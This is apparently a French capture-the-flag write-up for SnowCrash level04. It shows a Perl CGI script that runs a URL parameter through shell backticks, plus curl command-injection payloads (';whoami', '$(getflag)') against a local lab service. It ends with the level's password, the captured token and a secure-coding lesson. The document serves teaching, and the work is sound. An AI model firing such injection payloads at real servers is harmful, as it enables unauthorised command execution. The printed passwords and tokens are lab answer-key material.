📌 Présentation

Ce dépôt explique la résolution du level04 du projet SnowCrash.
Ce niveau a pour but de montrer un problème de sécurité très courant :
👉 l’exécution de commandes système à partir d’une entrée utilisateur non contrôlée.

🎯 Objectif du level

Comprendre pourquoi le script est dangereux
Exploiter la faille pour exécuter une commande
Récupérer le mot de passe de flag04
Passer au level05

🔐 Accès
su level04


Mot de passe :
qi0maab88jeaj46qoumi7maus

📂 Fichier fourni
ls
level04.pl
file level04

!N4|<eDm0|3R4t5


Il s’agit d’un script Perl, lisible et modifiable.

📖 Contenu du script
#!/usr/bin/perl
use CGI qw{param};
print "Content-type: text/html\n\n";

sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}

x(param("x"));

⚠️ Analyse de la vulnérabilité (le point clé)

La ligne dangereuse est :

print `echo $y 2>&1`;

Pourquoi est-ce dangereux ?
Les backticks ( ) en Perl signifient :
👉 exécuter une commande dans le terminal

$y contient ce que l’utilisateur envoie depuis l’URL

Le script ne vérifie pas ce que contient $y

➡️ L’utilisateur peut injecter des commandes système.

🌐 Comprendre l’entrée utilisateur

Quand on appelle l’URL :

curl "http://localhost:4747/?x=test"


Le script exécute :
echo test

➡️ Aucun danger, le texte est simplement affiché.

💥 Injection de commande (principe)

En Linux :
commande1 ; commande2

Signifie :
exécuter la commande1 puis la commande2
Donc si l’utilisateur envoie :

test;whoami

Le script exécute :

echo test;whoami

➡️ Deux commandes sont exécutées.

🌐 Encodage URL (point important)

Dans une URL, certains caractères sont spéciaux.
Le caractère ; doit être encodé :

; → %3B

espace → %20

🧪 Exploitation
Vérifier l’exécution de commande
curl "http://localhost:4747/?x=test%3Bwhoami"


Résultat attendu :

test
flag04


➡️ La commande est exécutée avec les droits de flag04.

🔑 Récupération du mot de passe
curl "http://localhost:4747/?x=test%3Bcat%20/home/user/flag04/README.txt"

RIEN """

➡️ Mauvais chemin

commande :  curl 'localhost:4747?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

Ce que disent les guillemets simples au shell local :
« Tout ce qu’il y a à l’intérieur est du TEXTE.
N’exécute rien. Ne réfléchis pas. Envoie tel quel. »

Donc :
$(getflag) n’est PAS exécuté sur ton terminal
il est envoyé tel quel au serveur
👉 Sans les guillemets simples, ça aurait échoué.


🧠 Leçon de sécurité (à retenir)

❌ Ne jamais exécuter une commande construite à partir d’une entrée utilisateur.

Bonne pratique :

ne pas utiliser de backticks avec des données utilisateur

traiter les entrées comme du texte, jamais comme des commandes

🧩 Résumé simple

Le script reçoit une valeur depuis le web

Il l’exécute dans le terminal

L’utilisateur peut ajouter des commandes

Le serveur obéit

C’est une faille de sécurité critique


token trouve : ne2searoevaevoem4ov4ar8ap